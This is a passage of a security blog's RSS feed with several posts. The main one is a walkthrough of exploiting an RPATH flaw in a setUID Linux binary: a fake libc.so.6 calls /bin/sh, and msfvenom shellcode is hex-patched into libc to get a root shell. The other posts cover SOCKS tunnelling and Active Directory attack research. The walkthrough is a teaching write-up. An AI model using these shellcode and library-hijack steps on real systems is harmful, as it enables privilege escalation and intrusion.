$ proxychains remmina
</pre>
<p>Where <a title="remmina" href="https://remmina.org/">remmina</a> is a pretty awesome RDP client for Linux. You can also use <a title="proxifier" href="https://www.proxifier.com/">proxifier</a> on Windows if you&#8217;d rather use mstsc.exe.</p>
<h2>Conclusion</h2>
<p>We showed a PoC to get a reverse SOCKS connection out of a network using tools that won&#8217;t trigger AV. They don&#8217;t require privileges run, so would work against an unprivileged windows user. The connection is faster than if we&#8217;d used the SOCKS features of C2 solutions that use polling reverse-HTTPS connections.</p>
<p>Our attack is untidy because the user can see everything that happens! It&#8217;s also awkward to set up because of the registry export and required packaging.</p>
<h2>Further Reading</h2>
<ul>
<li><a title="Chisel" href="https://github.com/jpillora/chisel">Chisel</a> is a tool that can create a SOCKS-over-SSH-over-CONNECT-HTTP tunnel in the opposite direction the direction I needed</li>
<li><a title="Crowbar" href="https://github.com/q3k/crowbar">Crowbar</a> is a tool that lets you do port forwarding over HTTP channels (no reliance on the proxy CONNECT method)</li>
</ul>
<p>The post <a href="https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/">Reverse port forwarding SOCKS proxy via HTTP proxy (part 1)</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>An offensive introduction to Active Directory on UNIX</title>
		<link>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/</link>
		<comments>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/#comments</comments>
		<pubDate>Thu, 06 Dec 2018 09:18:36 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[auditing]]></category>
		<category><![CDATA[Black Hat Europe]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[hardening]]></category>
		<category><![CDATA[red team]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[UNIX]]></category>
		<category><![CDATA[Windows]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6805</guid>
		<description><![CDATA[<p>By way of an introduction to our talk at Black Hat Europe, Security Advisory EMEAR would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests. Background to Active Directory integration [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>By way of an introduction to <a href="https://www.blackhat.com/eu-18/briefings/schedule/index.html#where-2-worlds-collide-bringing-mimikatz-et-al-to-unix-12962" title="our talk">our talk</a> at Black Hat Europe, <a href="https://www.cisco.com/c/en/us/products/security/advisory-services.html" title="Security Advisory EMEAR">Security Advisory EMEAR</a> would like to share the background on our recent research into some common Active Directory integration solutions. Just as with Windows, these solutions can be utilized to join UNIX infrastructure to enterprises&#8217; Active Directory forests.<span id="more-6805"></span></p>
<h2>Background to Active Directory integration solutions</h2>
<p>Having seen an uptick in unique UNIX infrastructures that are integrated into customers&#8217; existing Active Directory forests, the question becomes, &#8220;Does this present any concerns that may not be well understood?&#8221; This quickly became &#8220;What if an adversary could get into a UNIX box and then breach your domain?&#8221;<br />
Within a typical Active Directory integration solution (in this case <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/5.7_release_notes/sssd" title="SSSD">SSSD</a>), the solution shares a striking similarity to what a user might see on Windows. Notably, you have:</p>
<ul>
<li>DNS &#8211; Used for name resolution</li>
<li>LDAP &#8211; Used for &#8220;one-time identification&#8221; and assertion of identity</li>
<li>Kerberos &#8211; Used for ongoing authentication</li>
<li>SSSD &#8211; Like LSASS</li>
<li>PAM &#8211; Like msgina.dll or the more modern credential providers</li>
</ul>
<p>You can see a breakdown of this process <a title="here" href="https://rhelblog.redhat.com/2015/02/04/overview-of-direct-integration-options/">here</a>. Unlike Windows, there is no Group Policy for the most part (with some exceptions), so policies for sudo et al. are typically pushed as flat files to hosts.</p>
<h2>Our research</h2>
<p>Realistically, the threat models associated with each part of the implementation should be quite familiar to anyone securing a heterogeneous Windows network. Having worked with a variety of customers, it becomes apparent that the typical UNIX administrator who does not have a strong background in Windows and Active Directory will be ill-equipped to handle this threat. While we&#8217;ve been talking about successful attacks against components such as LSASS and Kerberos for quite some time, Mimikatz dates back to at least April 2014, and dumping hashes has been around even longer. Pwdump, which dumped local Windows hashes, was published by Jeremy Allison in 1997). However, no one has really taken a concerted look at whether these attacks are possible on UNIX infrastructure, nor how a blue team might spot an adversary performing them.</p>
<p>As a result of this research, we were able to develop tactics, tools, and procedures that might further assist an attacker in breaching an enterprise, and we began documenting and developing appropriate strategies to allow blue teams to appropriately detect and respond to such incursions. The Black Hat EU slides can be found <a title="here" href="/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">here</a> and whilst the tools we developed can be found on <a href="https://github.com/portcullislabs/linikatz" title="our GitHub repo">our GitHub repo</a>.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/">An offensive introduction to Active Directory on UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/an-offensive-introduction-to-active-directory-on-unix/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>Where 2 worlds collide: Bringing Mimikatz et al to UNIX</title>
		<link>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/</link>
		<comments>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/#comments</comments>
		<pubDate>Thu, 06 Dec 2018 08:04:06 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[auditing]]></category>
		<category><![CDATA[Black Hat Europe]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[conference]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[hardening]]></category>
		<category><![CDATA[red team]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[training]]></category>
		<category><![CDATA[UNIX]]></category>
		<category><![CDATA[Windows]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6806</guid>
		<description><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018). Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on Active Directory integration solutions for UNIX (as given at Black Hat Europe 2018).<span id="more-6806"></span></p>
<p>Over the past fifteen years there&#8217;s been an uptick in &#8220;interesting&#8221; UNIX infrastructures being integrated into customers&#8217; existing AD forests. Whilst the threat models enabled by this should be quite familiar to anyone securing a heterogeneous Windows network, they may not be as well understood by a typical UNIX admin who does not have a strong background in Windows and AD. Over the last few months we&#8217;ve spent some time looking a number of specific Active Directory integration solutions (both open and closed source) for UNIX systems and documenting some of the tools, tactics and procedures that enable attacks on the forest to be staged from UNIX.</p>
<p>This talk describes the technical details regarding our findings. It includes Proof of Concepts (PoC) showing real-world attacks against AD joined UNIX systems. Finally, potential solutions or mitigation controls are discussed that will help to either prevent those attacks or at the very least to detect them when they occur.</p>
<p>Tools referenced in this talk include:</p>
<ul>
<li><a href="https://github.com/portcullislabs/linikatz" title="Linikatz">Linikatz</a></li>
<ul>
<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/JohnTheRipper" title="JohnTheRipper dynamic.conf rules">JohnTheRipper dynamic.conf rules</a></li>
<li><a href="https://github.com/portcullislabs/linikatz/tree/master/red/metasploit-framework" title="metasploit-framework post-exploitation modules">metasploit-framework post-exploitation modules</a></li>
<li><a href="https://github.com/portcullislabs/linikatz/tree/master/blue/audit" title="auditd policies">auditd policies</a></li>
<li><a href="https://github.com/portcullislabs/linikatz/tree/master/tools/vas/fuzzers" title="fuzzers">fuzzers</a></li>
</ul>
</ul>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-5').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" title="Download Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="Eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" title="Download eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf" target="_blank" id="wpfb-file-link-5">eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf</a>
    
    <br />
    December 6, 2018<br />
    
  </div>
  <div class="info">
    724.9 KiB<br />
    MD5 hash: cc712c5e46b16fbff22a2566b1248a91 <br />
    <a href="#" onclick="return wpfilebase_filedetails(5);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails5" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>December 6, 2018</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/">Where 2 worlds collide: Bringing Mimikatz et al to UNIX</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/where-2-worlds-collide-bringing-mimikatz-et-al-to-unix/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>The importance of logs: You won&#8217;t see what you don&#8217;t log</title>
		<link>https://portcullislabs.github.io/presentations/the-importance-of-logs-you-wont-see-what-you-dont-log/</link>
		<comments>https://portcullislabs.github.io/presentations/the-importance-of-logs-you-wont-see-what-you-dont-log/#comments</comments>
		<pubDate>Wed, 31 Oct 2018 12:36:40 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Presentations]]></category>
		<category><![CDATA[blue team]]></category>
		<category><![CDATA[hardening]]></category>
		<category><![CDATA[red team]]></category>
		<category><![CDATA[SecureSouthWest]]></category>
		<category><![CDATA[training]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6793</guid>
		<description><![CDATA[<p>Presentation on logging and auditing strategies (as given at Secure South West 11). Building on my blog post on Cisco&#8217;s security blog entitled The Importance of Logs, I put together a presentation that picks apart some of the practical aspects of building a successful logging capability focusing on the need to document &#8220;good&#8221; and curate [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/presentations/the-importance-of-logs-you-wont-see-what-you-dont-log/">The importance of logs: You won&#8217;t see what you don&#8217;t log</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Presentation on logging and auditing strategies (as given at Secure South West 11).<span id="more-6793"></span></p>
<p>Building on my blog post on Cisco&#8217;s security blog entitled <a href="https://blogs.cisco.com/security/the-importance-of-logs">The Importance of Logs</a>, I put together a presentation that picks apart some of the practical aspects of building a successful logging capability focusing on the need to document &#8220;good&#8221; and curate &#8220;bad&#8221;.</p>
<p>The purpose of this talk is not to help you build a SOC in 30 minutes, rather it looks at how logging can go wrong and how to plan in order to get it right. The talk includes some composite case studies which highlight some of the challenges that we&#8217;ve seen over the years (particularly when responding in customer breaches) and makes some suggestions on where interested organisations should focus their efforts next.</p>
<div class="wpfilebase-file-default" onclick="if('undefined' == typeof event.target.href) document.getElementById('wpfb-file-link-6').click();">
  <div class="icon"><a href="https://portcullislabs.github.io/download/SSWTIOLYWSWYDL.pdf" target="_blank" title="Download SSWTIOLYWSWYDL"><img align="middle" src="https://portcullislabs.github.io/wp-includes/images/crystal/document.png" alt="SSWTIOLYWSWYDL" /></a></div>
  <div class="filetitle">
    <a href="https://portcullislabs.github.io/download/SSWTIOLYWSWYDL.pdf" title="Download SSWTIOLYWSWYDL.pdf" target="_blank" id="wpfb-file-link-6">SSWTIOLYWSWYDL.pdf</a>
    
    <br />
    October 31, 2018<br />
    
  </div>
  <div class="info">
    463.7 KiB<br />
    MD5 hash: 390c1d8b29e74f2c15df434b4d0d9f99 <br />
    <a href="#" onclick="return wpfilebase_filedetails(6);">Details</a>
  </div>
  <div class="details" id="wpfilebase-filedetails6" style="display: none;">
  
  <table border="0">
   
   
   
   
   
   
   <tr><td><strong>Date:</strong></td><td>October 31, 2018</td></tr>
  </table>
  </div>
 <div style="clear: both;"></div>
</div>
<p>The post <a href="https://portcullislabs.github.io/presentations/the-importance-of-logs-you-wont-see-what-you-dont-log/">The importance of logs: You won&#8217;t see what you don&#8217;t log</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/presentations/the-importance-of-logs-you-wont-see-what-you-dont-log/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>SetUID program exploitation: Crafting shared object files without a compiler</title>
		<link>https://portcullislabs.github.io/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/</link>
		<comments>https://portcullislabs.github.io/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/#comments</comments>
		<pubDate>Wed, 31 Oct 2018 12:18:59 +0000</pubDate>
		<dc:creator><![CDATA[MRL]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[root]]></category>
		<category><![CDATA[UNIX]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=6581</guid>
		<description><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this previous post [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>In this post we look at an alternative to compiling shared object files when exploiting vulnerable setUID programs on Linux. At a high level we&#8217;re just going to copy the binary and insert some shellcode. First we take a look the circumstances that might lead you to use this option. Also check out this <a title="previous post on setUID exploitation" href="/blog/exploiting-inherited-file-handles-in-setuid-programs">previous post on setUID exploitation</a>.<span id="more-6581"></span></p>
<h2>A hacker challenge gone wrong</h2>
<p>A long time ago, I set my team challenge of identifying an <a title="Breaking the Links: Exploiting the Linker" href="/presentations/breaking-the-links-exploiting-the-linker/">RPATH vulnerability</a> and (if possible) exploiting the vulnerability to run some code of their choosing with higher privileges. I named my program arp-ath &#8211; lest people wasted too much time looking for other attack vectors:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat arp-ath.c
#include &lt;stdio.h&gt;
int main(void) {
 printf(&quot;Hello world\n&quot;);
}
$ gcc -Wl,-rpath,. -o arp-ath arp-ath.c
# chmod 4755 arp-ath
</pre>
<p>The program behaves as you&#8217;d expect and is linked to libc.so.6 as you&#8217;d expect:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ./arp-ath
Hello world
$ ldd arp-ath
 linux-vdso.so.1 =&gt; (0x00007fff0a3fd000)
 libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb6dc0d6000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fb6dc489000)
</pre>
<p>The vulnerability lies in the fact the program seaches the current directory for its libraries:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ readelf -a arp-ath | grep -i path
0x000000000000000f (RPATH) Library rpath: [.]
</pre>
<p>(You&#8217;ll sometimes see RUNPATH instead of RPATH, but both work). Check it&#8217;s vulnerable like this:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ touch libc.so.6
$ ./arp-ath
./arp-ath: error while loading shared libraries: ./libc.so.6: file too short
</pre>
<p>This challenge is very similar to Level 15 of the <a title="Nebula Challenge" href="https://exploit-exercises.com/nebula/">Nebula challenge</a> if you want to play along using that &#8211; though it&#8217;s 32-bit.</p>
<p>The team found the &#8220;arp-ath&#8221; vulnerability pretty quickly and replied to let me know. Which you&#8217;d expect as it is their job to find such vulnerabilities on client systems during Build Reviews.</p>
<p>What I hadn&#8217;t personally anticipated is what a pain it is to create a malicious modified version of libc.so.6 on 64-bit Linux. So rather than face the embarrassment of having posted a challenge that I didn&#8217;t actually have a full solution for, I cobbled together the shellcode-based solution outlined above. First let&#8217;s have a look at the difficulties I had in creating my own libc.so.6.</p>
<h2>Problems compiling a replacement libc.so.6 on 64-bit Linux</h2>
<p>I lost my original notes of what I&#8217;d tried, but I&#8217;m pretty sure that I and my colleagues followed a similar path to this <a title="Nebula Level 15 Solution" href="http://www.pwntester.com/blog/2013/11/26/nebula-level15-write-up/">solution to the Nebula level 15 challenge</a> - which has a really nice writeup of how to debug shared libraries that don&#8217;t want to work.</p>
<p>Here&#8217;s an initial attempt, which should cause a shell to spawn when the library is loaded (note I could also have replaced the &#8220;puts&#8221; function).</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat exploit1.c
#include &lt;stdlib.h&gt;
int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
 system(&quot;/bin/sh&quot;);
}
$ gcc -fPIC -shared -o libc.so.6 exploit1.c
$ ldd ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
linux-vdso.so.1 (0x00007ffeea77d000)
libc.so.6 =&gt; ./libc.so.6 (0x00007f50430f9000)
$ ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: ./libc.so.6: no version information available (required by ./libc.so.6)
./arp-ath: relocation error: ./libc.so.6: symbol __cxa_finalize, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
</pre>
<p>So, let&#8217;s address those errors about lack of version numbers and failure to export __cxa_finalize (after much googling)&#8230;</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cat version
GLIBC_2.2.5{};
$ cat exploit2.c
#include &lt;stdlib.h&gt;

void __cxa_finalize (void *d) {
 return;
}

int __libc_start_main(int (*main) (int, char **, char **), int argc, char *argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void *stack_end) {
 system(&quot;/bin/sh&quot;);
}
$ gcc -fPIC -shared -Wl,--version-script=version -o libc.so.6 exploit2.c
$ ./arp-ath
./arp-ath: relocation error: ./libc.so.6: symbol system, version GLIBC_2.2.5 not defined in file libc.so.6 with link time reference
</pre>
<p>Hmm. More errors.</p>
<p>Cutting short a very long sequence of trial and error, when we eventually try to replicate the solution to the Nubula level 15 challenge on 64-bit, we find that it only seems to work for 32-bit:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 exploit2.c
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(system.o): relocation R_X86_64_32 against `.bss' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sysdep.o): relocation R_X86_64_TPOFF32 against symbol `errno' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/6/../../../x86_64-linux-gnu/libc.a(sigaction.o): relocation R_X86_64_32S against `.text' can not be used when making a shared object; recompile with -fPIC
/usr/bin/ld: final link failed: Nonrepresentable section on output
collect2: error: ld returned 1 exit status
</pre>
<p>If I understood my googling correctly, I need a version of libc that&#8217;s been compiled with -fPIC, but that&#8217;s not possible for some reason I didn&#8217;t understand.</p>
<p>I did consider grabbing the source for libc and recompiling it after a modification, but decided life was too short. I had a better (or at least quicker) idea&#8230;</p>
<h2>So just use metasploit, then?</h2>
<p>I had a quick go at generating a shared object file with msfvenom:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
msfvenom -a x64 -f elf-so -p linux/x64/exec CMD=/bin/sh AppendExit=true &gt; libc.so.6
$ ./arp-ath
./arp-ath: ./libc.so.6: no version information available (required by ./arp-ath)
./arp-ath: symbol lookup error: ./arp-ath: undefined symbol: __libc_start_main, version GLIBC_2.2.5
</pre>
<p>This was awfully familiar. I didn&#8217;t grapple much more with msfvenom after this.</p>
<h2>Patching shellcode into a copy of libc.so.6</h2>
<p>I figured I could open up a copy of libc.so.6 in a hex editor and paste in some shellcode over the top of __libc_start_main function. No matter how horribly I corrupted the file or how badly it crashed after it executed my shellcode, at least I&#8217;d have my shell.</p>
<p>I grabbed some shellcode off the internet &#8211; but equally could have generated in it Metasploit like this (I also appended a call to exit to stop the inevitable crash I mentioned):</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ msfvenom -a x64 -f hex -p linux/x64/exec CMD=/bin/sh AppendExit=true
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 55 bytes
Final size of hex file: 110 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e8080000002f62696e2f73680056574889e60f054831ff6a3c580f05
</pre>
<p>Then I made a copy of libc.so.6 and located the file offset for the __libc_start_main function:</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ cp /lib/x86_64-linux-gnu/libc.so.6 .
$ objdump -FD libc.so.6 | grep _main
00000000000201f0 &lt;__libc_start_main@@GLIBC_2.2.5&gt; (File Offset: 0x201f0):
...
</pre>
<p>Using a hexeditor I pasted in the shellcode.</p>
<pre class="brush: bash; gutter: false; title: ; notranslate">&lt;/span&gt;
&lt;pre&gt;$ hexedit libc.so.6
</pre>
<div id="attachment_6591" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6582"><div class="lb-album"><a href="#image-6582"><img src="https://portcullislabs.github.io/wp-content/uploads/2018/04/Screenshot_20180417_181649-300x37.png" alt="Use CTRL-G to seek to the offset in the file" class="size-medium wp-image-6591"><span></span></a></div>              
<a href="#imageclose-6582" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-6582">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2018/04/Screenshot_20180417_181649.png" alt="image-6582">
                   </div></a><p class="wp-caption-text">Use CTRL-G to seek to the offset in the file</p></div>
<p>(CTRL-G to go to an offset (0x201f0); paste in our shellcode; F2 to save; CTRL-C to quit.)</p>
<div id="attachment_6592" style="width: 310px" class="wp-caption alignnone"><a name="imageclose-6583"><div class="lb-album"><a href="#image-6583"><img src="https://portcullislabs.github.io/wp-content/uploads/2018/04/Screenshot_20180417_181927-300x115.png" alt="Shellcode pasted over existing code" class="size-medium wp-image-6592"><span></span></a></div>              
<a href="#imageclose-6583" class="css3lightbox-close">
				   <div class="lb-overlay" id="image-6583">
                   <img src="https://portcullislabs.github.io/wp-content/uploads/2018/04/Screenshot_20180417_181927.png" alt="image-6583">
                   </div></a><p class="wp-caption-text">Shellcode pasted over existing code</p></div>
<pre class="brush: bash; gutter: false; title: ; notranslate">
$ ./arp-ath
# id
uid=1000(x) gid=1000(x) euid=0(root) groups=1000(x)
</pre>
<p>Finally! <img src="https://portcullislabs.github.io/wp-includes/images/smilies/icon_smile.gif" alt=":-)" class="wp-smiley" /> </p>
<h2>And this works on AIX too?</h2>
<p>I tried to get this working on AIX &#8211; which typically doesn&#8217;t have a C compiler available; AND typically has loads of RPATH vulnerabilities. However, the shellcode I tried was self-modifying. This is fine when you&#8217;re injecting shellcode as data, but the code section I was injecting into was read-only. So I got a segfault. I&#8217;ll follow up if get this working.</p>
<h2>Conclusion</h2>
<p>The quick and dirty solution, while inevitably unsatisfactory is sometimes sufficient. Especially given the lack of tools, source, time you might have when exploiting this sort of vulnerabilities. Maybe it&#8217;s not a terrible solution. You be the judge.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/">SetUID program exploitation: Crafting shared object files without a compiler</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/setuid-program-exploitation-crafting-shared-object-files-without-a-compiler/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
